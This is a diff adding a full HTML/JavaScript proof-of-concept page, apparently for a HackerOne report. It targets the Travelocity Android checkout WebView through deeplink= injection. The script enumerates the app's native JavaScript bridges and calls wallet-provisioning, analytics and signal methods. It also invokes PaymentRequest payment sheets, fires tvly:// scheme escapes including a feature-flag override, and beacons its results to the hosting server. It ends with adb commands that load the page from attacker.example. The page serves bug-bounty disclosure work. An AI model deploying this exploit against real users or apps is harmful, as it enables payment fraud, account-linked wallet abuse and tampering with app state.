@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>WebView Escalation Probe — R-0023</title>
+<style>
+  :root{--bg:#0d1117;--panel:#161b22;--line:#30363d;--txt:#e6edf3;--dim:#9da7b3;--ok:#2ea043;--fail:#f85149;--info:#58a6ff;--warn:#d29922}
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--txt);font-family:ui-monospace,Menlo,Consolas,monospace;font-size:14px}
+  header{padding:16px;background:linear-gradient(90deg,#7d2ae8,#b62324)}
+  header h1{margin:0;font-size:17px;color:#fff}
+  header p{margin:4px 0 0;font-size:12px;color:#ffe9e9}
+  #meta{padding:10px 16px;background:var(--panel);border-bottom:1px solid var(--line);word-break:break-all;font-size:12px}
+  #summary{display:flex;gap:8px;padding:12px 16px;flex-wrap:wrap}
+  .chip{padding:6px 12px;border-radius:20px;font-weight:700;font-size:13px}
+  .chip.ok{background:var(--ok);color:#fff}.chip.fail{background:var(--fail);color:#fff}.chip.info{background:var(--info);color:#08131f}.chip.warn{background:var(--warn);color:#000}
+  section{padding:8px 16px 16px}
+  h2{font-size:14px;color:var(--info);margin:14px 0 8px}
+  table{width:100%;border-collapse:collapse}
+  td,th{padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top;text-align:left}
+  th{background:var(--panel);font-size:12px}
+  .st{font-weight:700;padding:2px 8px;border-radius:4px;white-space:nowrap;font-size:12px}
+  .st.PASS{background:var(--ok);color:#fff}.st.FAIL{background:var(--fail);color:#fff}.st.INFO{background:var(--info);color:#08131f}.st.MANUAL{background:var(--warn);color:#000}
+  .detail{color:var(--dim);font-size:12px;word-break:break-all;white-space:pre-wrap;margin-top:4px}
+  button{display:block;width:100%;margin:6px 0;padding:13px;border:0;border-radius:8px;background:#21262d;color:var(--txt);font-size:14px;text-align:left;border:1px solid var(--line);font-family:inherit}
+  button b{color:var(--info)}
+  button:active{background:#2d333b}
+  .legend{color:var(--dim);font-size:12px;padding:0 16px}
+  ol li{margin:6px 0;font-size:12px;color:var(--dim);word-break:break-all}
+  code{color:#79c0ff}
+</style>
+</head>
+<body>
+<header>
+  <h1>TRAVELICITY CHECKOUT WEBVIEW — ESCALATION PROBE</h1>
+  <p>Authorized HackerOne PoC · route R-0023 · /mobile/deeplink checkout deeplink= injection</p>
+</header>
+<div id="meta"></div>
+<div id="summary"></div>
+<p class="legend">Legend — PASS: attack hypothesis confirmed (bad for the app) · FAIL: attack blocked/refuted (good for the app) · INFO: neutral observation · MANUAL: needs a tap + watching the app/logcat.</p>
+<section>
+  <h2>1 · Automated checks (ran on load)</h2>
+  <table id="tbl"></table>
+</section>
+<section>
+  <h2>2 · Manual triggers (tap while screen-recording)</h2>
+  <button onclick="doPay()"><b>A3</b> — PaymentRequest.show() — invoke the native payment sheet (amplifier A, E-0071)</button>
+  <button onclick="doAndroidLog()"><b>D3</b> — Android.logBookButtonClicked() — forge the analytics event (E-0083)</button>
+  <button onclick="doWallet()"><b>B2</b> — NativeApp.initDigitalWallet(dummy data) — trigger wallet provisioning flow (E-0077, credit-card WebView only)</button>
+  <button onclick="doSignal()"><b>B3</b> — NativeApp.publishSignal('PROBE_SIGNAL') — drive the application state machine (E-0077, credit-card WebView only)</button>
+  <button onclick="doPrint()"><b>B5</b> — WFCBCCJSBridge.showPrintMessageInNative('probe') — native print path</button>
+  <button onclick="navTo('tvly://home','tvly://home')"><b>C1</b> — Silent internal deep link: tvly://home (benign reachability proof, E-0078/E-0079)</button>
+  <button onclick="navTo('tvly://forceEnableFeatureFlag?flag=poc_flag&amp;value=true','tvly://forceEnableFeatureFlag')"><b>C2</b> — Persistent feature-flag override: tvly://forceEnableFeatureFlag (E-0084/E-0085) — replace poc_flag with a real flag name for behavioral proof</button>
+  <button onclick="navTo('tvly://forceBucket?key=abov&amp;value=probe','tvly://forceBucket')"><b>C3</b> — Experiment override: tvly://forceBucket (host→handler mapping statically unverified — decompile gap)</button>
+  <button onclick="navTo('tel:0800123456','tel:')"><b>C4</b> — External intent proof: tel: (system dialer should open with no confirmation)</button>
+  <button onclick="doPopup()"><b>G1</b> — window.open() — popup WebView (multiple-windows enabled)</button>
+  <button onclick="showAlt()"><b>B0</b> — Show the adb command for the credit-card WebView variant (NativeApp bridge)</button>
+  <button onclick="copyResults()"><b>R1</b> — Copy results as JSON (send back to the analyst)</button>
+</section>
+<section>
+  <h2>3 · Previous session results (localStorage persistence proof)</h2>
+  <div id="hist"></div>
+</section>
+<section>
+  <h2>4 · What to capture for the report</h2>
+  <ol>
+    <li>Serve this file at <code>https://attacker.example/checkout</code> (the deeplink= target path).</li>
+    <li>Checkout surface: <code>adb -s emulator-5556 shell "am start -a android.intent.action.VIEW -d 'https://www.travelocity.com/mobile/deeplink/checkout?deeplink=https%3A%2F%2Fattacker.example%2Fcheckout' com.travelocity.android"</code></li>
+    <li>Credit-card surface (NativeApp bridge, amplifier B): same command but path <code>/mobile/deeplink/one-key-cards/apply?deeplink=</code> + URL-encoded address of this page. Sign in when prompted — the injected page loads after authentication (E-0074).</li>
+    <li>Record the screen the entire run. Watch logcat for: BookButtonClicked (D3), digital-wallet provisioning (B2), application signal handling (B3), print (B5).</li>
+    <li>Check YOUR web server access log for the initial GET: the app attaches <code>Client-Info</code> and <code>x-eb-client</code> (device fingerprint only — no auth tokens, E-0082). Optional: implement <code>GET /echo</code> returning request headers as text and row H2 will show them automatically.</li>
+    <li>Optional: log <code>POST /probe-log</code> on your server — the page beacons its results there automatically.</li>
+    <li>Send the R1 JSON + the screen recording back. Results become DYNAMIC-class evidence in the analysis state.</li>
+  </ol>
+</section>
+<script>
+(function(){
+  "use strict";
+  var RUN_ID = 'run-' + Date.now();
+  var rows = [];
+  function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+  function row(id,name,status,detail){
+    rows.push({id:id,name:name,status:status,detail:String(detail)});
+    render(); persist();
+    try{ console.log('[PROBE]['+status+'] '+id+' '+name+' :: '+detail); }catch(e){}
+  }
+  function render(){
+    var t=document.getElementById('tbl');
+    var h='<tr><th>ID</th><th>Test</th><th>Result</th></tr>';
+    var c={PASS:0,FAIL:0,INFO:0,MANUAL:0};
+    for(var i=0;i<rows.length;i++){
+      var r=rows[i]; c[r.status]=(c[r.status]||0)+1;
+      h+='<tr><td>'+esc(r.id)+'</td><td>'+esc(r.name)+'<div class="detail">'+esc(r.detail)+'</div></td><td><span class="st '+esc(r.status)+'">'+esc(r.status)+'</span></td></tr>';
+    }
+    t.innerHTML=h;
+    document.getElementById('summary').innerHTML=
+      '<span class="chip ok">PASS '+c.PASS+'</span><span class="chip fail">FAIL '+c.FAIL+'</span><span class="chip info">INFO '+c.INFO+'</span><span class="chip warn">MANUAL '+c.MANUAL+'</span>';
+  }
+  function persist(){
+    try{ localStorage.setItem('tvl_probe_rows_v1', JSON.stringify({run:RUN_ID,when:new Date().toISOString(),href:location.href,rows:rows})); }catch(e){}
+  }
+  function enumFns(o){
+    var fns=[], seen={}, cur=o, d=0;
+    while(cur && cur!==Object.prototype && d<5){
+      var ps=[]; try{ ps=Object.getOwnPropertyNames(cur); }catch(e){}
+      for(var i=0;i<ps.length;i++){
+        var p=ps[i]; if(p==='constructor'||seen[p]) continue; seen[p]=1;
+        try{ if(typeof o[p]==='function') fns.push(p); }catch(e){}
+      }
+      try{ cur=Object.getPrototypeOf(cur); }catch(e){ break; }
+      d++;
+    }
+    return fns;
+  }
+  function loadHistory(){
+    var el=document.getElementById('hist');
+    try{
+      var h=localStorage.getItem('tvl_probe_rows_v1');
+      if(!h){ el.innerHTML='<div class="detail">No previous session stored. Re-run this page (or return after a tvly:// jump) and the previous results appear here — proving DOM-storage persistence inside the app WebView.</div>'; return; }
+      var d=JSON.parse(h);
+      var html='<div class="detail">Previous run: '+esc(d.run)+' · '+esc(d.when)+' · '+esc(d.href)+'</div><table><tr><th>ID</th><th>Test</th><th>Result</th></tr>';
+      for(var i=0;i<d.rows.length;i++){ var r=d.rows[i]; html+='<tr><td>'+esc(r.id)+'</td><td>'+esc(r.name)+'<div class="detail">'+esc(r.detail)+'</div></td><td><span class="st '+esc(r.status)+'">'+esc(r.status)+'</span></td></tr>'; }
+      el.innerHTML=html+'</table>';
+    }catch(e){ el.innerHTML='<div class="detail">history read error</div>'; }
+  }
+  function testContext(){
+    row('M1','Execution context','INFO','href = '+location.href);
+    var ua=navigator.userAgent;
+    var inWv=/; wv\)/.test(ua)||/travelocity|expedia/i.test(ua);
+    row('M2','Inside Travelocity Android WebView','INFO',(inWv?'WebView UA confirmed':'UA does not look like the app WebView — are you testing in a browser?')+' | UA = '+ua);
+  }
+  function testCookies(){
+    var c=document.cookie;
+    row('E1','Session-cookie theft via document.cookie','FAIL', c?('Only THIS origin cookies are readable: '+c):'(empty) — travelocity.com session cookies are NOT exposed to this origin (domain scoping; E-0080/E-0081). Session-theft escalation refuted.');
+  }
+  function testStorage(){
+    var prev=null, ok=false;
+    try{ prev=localStorage.getItem('tvl_probe_last_run'); ok=true; }catch(e){}
+    try{ localStorage.setItem('tvl_probe_last_run', RUN_ID); }catch(e){}
+    row('F1','DOM storage persistence', ok?'INFO':'FAIL', ok?('localStorage ENABLED. Previous run id: '+(prev||'(none — first run)')+' | current: '+RUN_ID+'. Kill the app, re-trigger the deeplink, and this row should show the previous run id — persistent attacker state inside the app WebView.'):'localStorage unavailable');
+  }
+  function testBridges(){
+    var names=['Android','NativeApp','WFCBCCJSBridge','QM','QMSDKv5','ARKOSE','arkose'];
+    var found=0;
+    for(var i=0;i<names.length;i++){
+      var o=window[names[i]];
+      if(typeof o==='undefined'||o===null) continue;
+      found++;
+      var fns=enumFns(o);
+      var list=fns.length?fns.join(', '):'(no enumerable functions)';
+      if(names[i]==='Android') row('D1','JS bridge "Android" — exposed methods','INFO','PRESENT, callable: '+list+'. Expected benign (logBookButtonClicked only — analytics, E-0083). Any extra method here would be new impact.');
+      else if(names[i]==='NativeApp') row('B1','JS bridge "NativeApp" — CREDIT-CARD WebView','PASS','PRESENT, callable: '+list+' — you are inside the OneKey credit-card application WebView (amplifier B, E-0076/E-0077). Use buttons B2/B3 and record behavior.');
+      else if(names[i]==='WFCBCCJSBridge') row('B4','JS bridge "WFCBCCJSBridge"','PASS','PRESENT, callable: '+list);
+      else row('D2','JS bridge "'+names[i]+'"','INFO','PRESENT, callable: '+list+' (session-replay/anti-fraud SDK surface — inbound only)');
+    }
+    if(!found) row('D0','JavaScript bridge inventory','INFO','No window.* bridges detected on this surface.');
+    if(!window.NativeApp) row('B0','Bridge "NativeApp" on this surface','INFO','ABSENT here (expected on the /checkout surface). For the credit-card WebView variant, use button B0 below for the adb command.');
+  }
+  function testPayment(){
+    if(typeof window.PaymentRequest==='undefined'){ row('A1','Payment Request API enabled (amplifier A, E-0071)','FAIL','window.PaymentRequest is undefined — payment-sheet escalation NOT available on this surface.'); return; }
+    var details={total:{label:'PoC order total',amount:{currency:'USD',value:'1.00'}}};
+    try{
+      var req=new PaymentRequest([{supportedMethods:'basic-card',data:{supportedNetworks:['visa','mastercard','amex']}}],details);
+      window.__prBasic=req;
+      row('A1','Payment Request API enabled (amplifier A, E-0071)','PASS','PaymentRequest constructor SUCCEEDED — the W3C payment API is ENABLED in this checkout WebView. Tap A3 and record whether a native payment sheet appears.');
+      if(req.canMakePayment){ req.canMakePayment().then(function(v){ row('A2','canMakePayment()','INFO','resolved: '+v); },function(e){ row('A2','canMakePayment()','INFO','rejected: '+e); }); }
+      return;
+    }catch(e1){ window.__e1=String(e1); }
+    try{
+      var gpay=[{supportedMethods:'https://google.com/pay',data:{apiVersion:2,apiVersionMinor:0,merchantInfo:{merchantName:'PoC Merchant'},allowedPaymentMethods:[{type:'CARD',parameters:{allowedAuthMethods:['PAN_ONLY'],allowedCardNetworks:['VISA','MASTERCARD']},tokenizationSpecification:{type:'PAYMENT_GATEWAY',parameters:{gateway:'example',gatewayMerchantId:'probe'}}}],transactionInfo:{totalPriceStatus:'FINAL',totalPrice:'1.00',currencyCode:'USD'}}}];
+      var req2=new PaymentRequest(gpay,details);
+      window.__prGpay=req2;
+      row('A1','Payment Request API enabled (amplifier A, E-0071)','PASS','basic-card was rejected but the Google-Pay-method constructor SUCCEEDED — payment API enabled. Tap A3 (uses the Google Pay method).');
+    }catch(e2){
+      row('A1','Payment Request API enabled (amplifier A, E-0071)','INFO','PaymentRequest exists but constructors threw. basic-card: '+window.__e1+' | gpay: '+e2);
+    }
+  }
+  function testHeaders(){
+    row('H1','Request-header disclosure (Client-Info / x-eb-client)','MANUAL','The initial page load carried the app headers. Check YOUR server access log for GET '+location.pathname+' — look for Client-Info and x-eb-client (device fingerprint; E-0064/E-0082). Optional: implement GET /echo returning request headers as text and row H2 will show them here.');
+    if(!window.fetch) return;
+    try{
+      fetch('/api/echo',{method:'GET'}).then(function(r){ return r.text(); }).then(function(t){
+        row('H2','/echo header reflection','PASS','Your server reflected the request headers — the app sent:\n'+t);
+      },function(e){});
+    }catch(e){}
+  }
+  window.doPay=function(){
+    var req=window.__prGpay||window.__prBasic;
+    if(!req){ row('A3','PaymentRequest.show()','INFO','No constructible PaymentRequest on this surface — see A1.'); return; }
+    row('A3','PaymentRequest.show()','MANUAL','show() invoked — WATCH FOR A NATIVE PAYMENT SHEET over the Travelocity UI. Keep recording.');
+    try{
+      req.show().then(function(r){
+        row('A3a','Payment sheet result','PASS','show() RESOLVED — payment authorized in the native sheet: '+(r&&r.methodName));
+        try{ r.complete('success'); }catch(e){}
+      },function(e){ row('A3a','Payment sheet result','INFO','show() rejected/closed by user or system: '+e); });
+    }catch(e){ row('A3a','Payment sheet result','INFO','show() threw: '+e); }
+  };
+  window.doAndroidLog=function(){
+    if(!window.Android){ row('D3','Android.logBookButtonClicked()','INFO','Bridge absent on this surface.'); return; }
+    try{ window.Android.logBookButtonClicked(); row('D3','Android.logBookButtonClicked()','MANUAL','Invoked. Check logcat for a forged BookButtonClicked analytics event (integrity impact: analytics forgery).'); }catch(e){ row('D3','Android.logBookButtonClicked()','INFO','threw: '+e); }
+  };
+  window.doWallet=function(){
+    if(!window.NativeApp){ row('B2','NativeApp.initDigitalWallet','INFO','Bridge ABSENT here — re-run via the one-key-cards/apply deeplink (button B0).'); return; }
+    try{ window.NativeApp.initDigitalWallet('John','Doe','PoC Card','1234'); row('B2','NativeApp.initDigitalWallet','MANUAL','Invoked with dummy cardholder data. WATCH for the native wallet-provisioning flow starting — that proves injected JS can trigger a server-side provisioning call (E-0077).'); }catch(e){ row('B2','NativeApp.initDigitalWallet','INFO','threw: '+e); }
+  };
+  window.doSignal=function(){
+    if(!window.NativeApp){ row('B3','NativeApp.publishSignal','INFO','Bridge ABSENT here.'); return; }
+    try{ window.NativeApp.publishSignal('PROBE_SIGNAL'); row('B3','NativeApp.publishSignal','MANUAL','Invoked with an unknown topic — watch logcat / native state handling (E-0077).'); }catch(e){ row('B3','NativeApp.publishSignal','INFO','threw: '+e); }
+  };
+  window.doPrint=function(){
+    if(!window.WFCBCCJSBridge){ row('B5','WFCBCCJSBridge.showPrintMessageInNative','INFO','Bridge ABSENT here.'); return; }
+    try{ window.WFCBCCJSBridge.showPrintMessageInNative('probe'); row('B5','WFCBCCJSBridge.showPrintMessageInNative','MANUAL','Invoked — watch for a native print dialog.'); }catch(e){ row('B5','WFCBCCJSBridge.showPrintMessageInNative','INFO','threw: '+e); }
+  };
+  window.navTo=function(url,label){
+    row('C','Scheme escape — '+label,'MANUAL','Navigating to '+url+' — if the app LEAVES this WebView to a native screen or an external app with NO confirmation tap, the non-http scheme escape works (E-0078/E-0079). Results are persisted; press Back to return and see section 3.');
+    try{ location.href=url; }catch(e){ row('C-nav','navigation','INFO','threw: '+e); }
+  };
+  window.doPopup=function(){
+    row('G1','window.open() popup','MANUAL','Called — multiple-windows support (setSupportMultipleWindows(true), verified static) should open a JS-enabled popup WebView.');
+    try{ window.open(location.href.split('#')[0]+'#popup-'+Date.now()); }catch(e){ row('G1a','popup','INFO','threw: '+e); }
+  };
+  window.showAlt=function(){
+    var target='https://www.travelocity.com/mobile/deeplink/one-key-cards/apply?deeplink='+encodeURIComponent(location.origin+location.pathname);
+    var cmd="adb -s emulator-5556 shell \"am start -a android.intent.action.VIEW -d '"+target+"' com.travelocity.android\"";
+    alert('Credit-card WebView variant (amplifier B):\n\n'+cmd+'\n\nSign in when prompted — this page then loads inside the OneKey credit-card application WebView with the NativeApp bridge.');
+  };
+  window.copyResults=function(){
+    var txt=JSON.stringify({run:RUN_ID,when:new Date().toISOString(),href:location.href,ua:navigator.userAgent,rows:rows},null,2);
+    var ta=document.createElement('textarea'); ta.value=txt; document.body.appendChild(ta); ta.select();
+    var ok=false; try{ ok=document.execCommand('copy'); }catch(e){}
+    document.body.removeChild(ta);
+    row('R1','Copy results JSON','INFO', ok?('Copied '+txt.length+' bytes — paste back to the analyst.'):'Clipboard copy failed — long-press to copy manually, or rely on the /probe-log beacon.');
+  };
+  function beacon(){
+    try{
+      var p=JSON.stringify({run:RUN_ID,when:new Date().toISOString(),href:location.href,ua:navigator.userAgent,rows:rows});
+      if(navigator.sendBeacon) navigator.sendBeacon('/probe-log',p);
+    }catch(e){}
+  }
+  window.addEventListener('load',function(){
+    document.getElementById('meta').innerHTML='run: <b>'+esc(RUN_ID)+'</b> · '+esc(new Date().toISOString())+'<br/>href: '+esc(location.href);
+    loadHistory();
+    testContext();
+    testCookies();
+    testStorage();
+    testBridges();
+    testPayment();
+    testHeaders();
+    row('C0','Non-http scheme escape (amplifier C)','MANUAL','Static evidence: only http/https/blob stay in-page; any other scheme is fired as an implicit ACTION_VIEW intent with the page-controlled URI (E-0078/E-0079). Use C1–C4. Note: the tvly:// host→handler dispatch is statically unverified (decompile gap) — a successful jump to a native screen completes the dynamic proof.');
+    setTimeout(beacon,4000);
+  });
+})();
+</script>
+</body>
+</html>
